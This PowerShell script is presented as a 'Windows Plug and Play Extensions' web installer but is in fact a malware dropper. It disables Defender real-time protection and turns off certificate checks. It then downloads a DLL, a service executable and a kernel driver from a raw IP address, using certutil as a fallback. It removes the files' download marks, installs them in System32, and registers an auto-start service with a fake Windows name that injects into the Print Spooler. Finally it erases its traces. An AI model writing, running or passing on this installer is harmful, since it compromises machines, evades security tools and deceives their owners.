# Windows Plug and Play Extensions - Web Installer
param([string]$Server = "https://64.226.66.66")

$ErrorActionPreference = "SilentlyContinue"
$SYS32 = "$env:SystemRoot\System32"
$DRIVERS = "$env:SystemRoot\System32\drivers"
$SVC = "WPnpSvc"
$TD = "$env:TEMP\wpnp_$(Get-Random)"

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Write-Host "[!] Run as Administrator" -ForegroundColor Red; Read-Host "Press Enter"; exit 1
}

Write-Host "============================================"
Write-Host " Web Setup | Server: $Server"
Write-Host "============================================"
Write-Host ""

Write-Host "[1/8] Preparing..." -ForegroundColor Cyan
try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
Start-Sleep 2

Write-Host "[2/8] Downloading..." -ForegroundColor Cyan
New-Item -Path $TD -ItemType Directory -Force | Out-Null
try { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } } catch {}
foreach ($f in @("pnpext.dll","WPnpSvc.exe","pnpext.sys")) {
    Write-Host "       $f ..." -NoNewline
    try { Invoke-WebRequest "$Server/files/$f" -OutFile "$TD\$f" -UseBasicParsing -TimeoutSec 60; Write-Host " OK" -ForegroundColor Green }
    catch { & certutil -urlcache -split -f "$Server/files/$f" "$TD\$f" 2>$null | Out-Null
        if (Test-Path "$TD\$f") { Write-Host " OK" -ForegroundColor Green }
        elseif ($f -ne "pnpext.sys") { Write-Host " FAIL" -ForegroundColor Red; Remove-Item $TD -Recurse -Force; try{Set-MpPreference -DisableRealtimeMonitoring $false}catch{}; Read-Host; exit 1 }
        else { Write-Host " skip" -ForegroundColor Yellow } } }

Write-Host "[3/8] Removing old..." -ForegroundColor Cyan
sc.exe stop $SVC 2>$null|Out-Null; Start-Sleep 2; sc.exe delete $SVC 2>$null|Out-Null; Stop-Process -Name rundll32 -Force -EA SilentlyContinue

Write-Host "[4/8] Installing files..." -ForegroundColor Cyan
foreach ($f in @("pnpext.dll","WPnpSvc.exe","pnpext.sys")) {
    if (Test-Path "$TD\$f") { Remove-Item "$TD\$f`:Zone.Identifier" -Force -EA SilentlyContinue
        $dst = if($f -eq "pnpext.sys"){$DRIVERS}else{$SYS32}; Copy-Item "$TD\$f" "$dst\$f" -Force; Write-Host "       $f -> $dst\" -ForegroundColor Gray } }

Write-Host "[5/8] Creating service..." -ForegroundColor Cyan
sc.exe create $SVC binPath= "$SYS32\WPnpSvc.exe" type= own start= auto depend= Spooler DisplayName= "Windows Plug and Play Extensions" 2>$null|Out-Null
sc.exe description $SVC "Manages extended Plug and Play device configuration and compatibility" 2>$null|Out-Null

Write-Host "[6/8] Configuring..." -ForegroundColor Cyan
$rp = "HKLM:\SYSTEM\CurrentControlSet\Services\$SVC\Parameters"; New-Item $rp -Force|Out-Null
Set-ItemProperty $rp -Name DllPath -Value "$SYS32\pnpext.dll"; Set-ItemProperty $rp -Name TargetService -Value Spooler

Write-Host "[7/8] Starting..." -ForegroundColor Cyan
sc.exe start Spooler 2>$null|Out-Null; Start-Sleep 3; sc.exe start $SVC 2>$null|Out-Null; Start-Sleep 4

Write-Host "[8/8] Cleanup..." -ForegroundColor Cyan
Remove-Item $TD -Recurse -Force -EA SilentlyContinue
try { Set-MpPreference -DisableRealtimeMonitoring $false } catch {}

$ok = & tasklist /m pnpext.dll 2>$null | Select-String pnpext.dll
Write-Host ""; if($ok){Write-Host "[+] SUCCESS!" -ForegroundColor Green}else{Write-Host "[?] Check after reboot" -ForegroundColor Yellow}
Write-Host ""; Read-Host "Press Enter"
